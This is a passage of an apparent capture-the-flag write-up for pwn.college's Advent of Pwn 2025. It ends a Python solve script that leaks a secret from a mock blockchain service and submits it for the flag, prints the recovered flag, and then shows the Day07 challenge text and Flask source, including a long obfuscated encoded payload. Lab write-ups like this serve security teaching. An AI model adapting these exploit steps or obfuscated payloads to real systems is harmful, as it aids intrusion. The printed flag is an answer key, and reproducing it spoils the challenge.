                <span class="n">n</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">-gift</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">map_nonce</span><span class="p">:</span>
                    <span class="n">idx</span> <span class="o">=</span> <span class="n">map_nonce</span><span class="p">[</span><span class="n">n</span><span class="p">]</span>
                    <span class="k">if</span> <span class="n">chars</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                        <span class="n">chars</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">gift</span><span class="sh">"</span><span class="p">]</span>
                        <span class="n">found</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="n">updated</span> <span class="o">=</span> <span class="bp">True</span>
        
        <span class="k">if</span> <span class="n">updated</span> <span class="ow">or</span> <span class="n">found</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">:</span>
            <span class="n">s_str</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="n">c</span> <span class="k">if</span> <span class="n">c</span> <span class="k">else</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">])</span>
            <span class="nf">print_progress</span><span class="p">(</span><span class="n">found</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sh">"</span><span class="s">   Finding</span><span class="sh">"</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Secret: </span><span class="si">{</span><span class="n">s_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">found</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">:</span> <span class="k">break</span>
        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">full</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">   -&gt; SECRET: </span><span class="si">{</span><span class="n">full</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">full</span>

<span class="k">def</span> <span class="nf">step3_flag</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
    <span class="nf">log</span><span class="p">(</span><span class="sh">"</span><span class="s">Step 3: Get flag</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">n</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">flag-</span><span class="si">{</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span> 
          <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">LETTER_HEADER</span><span class="si">}{</span><span class="n">sec</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">n</span><span class="p">}</span>
    <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
    <span class="nf">mine_block</span><span class="p">([</span><span class="n">tx</span><span class="p">])</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">CONFIRMATION_DEPTH</span><span class="p">):</span>
        <span class="nf">mine_block</span><span class="p">([])</span>

    <span class="n">tgt</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">-gift</span><span class="sh">"</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
    <span class="k">while</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mi">60</span><span class="p">:</span>
        <span class="n">pool</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/txpool</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">().</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">,</span> <span class="p">[])</span> <span class="o">+</span> <span class="nf">scan_recent_blocks</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">pool</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">)</span> <span class="o">==</span> <span class="n">tgt</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">&gt;&gt;&gt; FLAG: </span><span class="si">{</span><span class="n">tx</span><span class="p">[</span><span class="sh">'</span><span class="s">gift</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">return</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="se">\r</span><span class="s">   -&gt; Finding flag...</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">   -&gt; Flag not found.</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">load_key</span><span class="p">()</span>
        <span class="nf">step1_nan</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">step2_leak</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span> <span class="nf">step3_flag</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error: Did not get full secret.</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div></details><p>Result:</p><p><a href="/assets/img/AdventOfPwn2025/pic33.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic33.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{sCN93bmsORhYiuM4Hhm91eEkjRT.0FNxkTMywiN1UDN0EzW}</code></p><hr /><h2 id="day07"><span class="me-2">Day07</span><a href="#day07" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-6"><span class="me-2">Description</span><a href="#description-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><strong>Wow, Zardus thinks he‚Äôs Santa üéÖ</strong>, offering a cheerful Naughty-or-Nice checker on <code class="language-plaintext highlighter-rouge">http://localhost/</code> ‚Äî but in typical holiday overkill, it has been served as a full festive <em>turducken</em>: <strong>a bright, welcoming outer roast ü¶É</strong>, <strong>a warm, well-seasoned middle stuffing ü¶Ü</strong>, and <strong>a rich, indulgent core that ties the whole dish together üêî</strong>. It all looks merry enough at first glance, yet the whole thing feels suspiciously overstuffed üéÅ. Carve into this holiday creation and see what surprises have been tucked away at the center.</p><hr /><h3 id="analysis-6"><span class="me-2">Analysis</span><a href="#analysis-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>turkey.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">abort</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">base64</span>
<span class="kn">import</span> <span class="n">subprocess</span>

<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="sh">'</span><span class="s">SGRib2IuLSAtIW0sKyBtMDE3bWInMCM1Jy4mJisvYiEnOidiMSw2JyxiMitiPmJgSHlrP0h5ayIePxYQDRI5Zh54PxYRDQo5Zh5tbXgyNjYqYiwtYiUsKywsNzBiMCc0MCcRIh5qJS0ubCcuLTEsLSFiYmJiSDlifH9ia2pibhYRDQpibhYQDRJqLCc2MSsubDAnNDAnMUh5YB57dWxwdWx7dWxwdWAeYn9iFhENCmI2MSwtIUh5cnpiPj5iFhANEmw0LCdsMTEnIS0wMmJ/YhYQDRJiNjEsLSFISHlrP0g/YmJIeWtlfHMqbX4mLDctBGI2LQx8cyp+ZWomLCdsMScwYmJiYkh5az9iZS4vNiptNjonNmVieGUnMjsWbzYsJzYsLQFlYjlibnZydmomIycKJzYrMDVsMScwYmJiYkg5YicxLidiP2JiSD9iYmJiSHlrIh58cyptfj8nJSMxMScvbDAtMDAnOWYeYngOEBdiJSwrKiE2JyRiMC0wMAd8cyp+Ih5qJiwnbDEnMGJiYmJiYkh5az9iZS4vNiptNjonNmVieGUnMjsWbzYsJzYsLQFlYjlibnJyd2omIycKJzYrMDVsMScwYmJiYmJiSDliazAtMDAnamIqITYjIWI/YmJiYkh5azYsJzYsLSFqJiwnbDEnMGJiYmJiYkh5az9iZSwrIy4ybTY6JzZlYnhlJzI7Fm82LCc2LC0BZWI5Ym5ycnBqJiMnCic2KzA1bDEnMGJiYmJiYkh5a2o2Oic2bCcxLC0yMScwYjYrIzUjYn9iNiwnNiwtIWI2MSwtIWJiYmJiYkh5ay4wFzYnJTAjNmoqITYnJGI2KyM1I2J/YicxLC0yMScwYjYxLC0hYmJiYmJiSDliOzA2YmJiYkhIP2JiYmJIeSwwNzYnMGJiYmJiYkh5a2V8cyptfjAnNicvIzAjMmIuMDdiJSwrMTErD3xzKn5laiYsJ2wxJzBiYmJiYmJIeWs/YmUuLzYqbTY6JzZlYnhlJzI7Fm82LCc2LC0BZWI5Ym5ycnZqJiMnCic2KzA1bDEnMGJiYmJiYkg5YmsuMBc2JyUwIzZjamIkK2JiYmJISHkuMDdsOzAnNzNsLjAXJicxMCMyYn9iLjAXNiclMCM2YjYxLC0hYmJiYkg5YmtlKiE2JyRtZWJ/f39iJy8jLCo2IzJsLjAXJicxMCMy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BxBiKG9iNjEtKm8qNic0Yi1vYhYXEhYXDWIDb2IxJy4gIzYyK0gWEgcBAQNiKG9iNi0tMGIwJyw1LW8mKzdvb2IwJyw1LWIvb2I2MS0qbyo2JzRiLW9iFhcSFhcNYgNvYjEnLiAjNjIrSEgyN2ItLmI2JzFiKSwrLmIyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitIYmJic2xwdWx7dWxwdWIjKzRiNi43IyQnJmImJiNiJzY3LTBiMitiJzAjNScuJiYrL2IhJzonYjEsNicsYjIrSDI3YicwIzUnLiYmKy9vKjYnNGI2JzFiKSwrLmIyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitIJzAjNScuJiYrL28qNic0YjQnJmJ2cG17dWxwdWx7dWxwdWImJiNiMCYmI2IyK2InMCM1Jy4mJisvYiEnOidiMSw2JyxiMitISDI3YjYxLSpvKjYnNGI2JzFiKSwrLmIyK0g2MS0qbyo2JzRiNCcmYnZwbXNscHVse3VscHViJiYjYjAmJiNiMitIJzAjNScuJiYrL2IxLDYnLGInMCM1Jy4mJisvbyo2JzRiNicxYiksKy5iMitIJzAjNScuJiYrL28qNic0YicvIyxiMCcnMmIqNic0YicyOzZiNjEtKm8qNic0YiYmI2IpLCsuYjIrSCcwIzUnLiYmKy9iJiYjYjEsNicsYjIr</span><span class="sh">'</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">NAUGHTY_LIST</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="s">adamd</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">kanak</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">claude</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">gpt</span><span class="sh">'</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">DEFAULT_IMAGE</span> <span class="o">=</span> <span class="sh">'</span><span class="s">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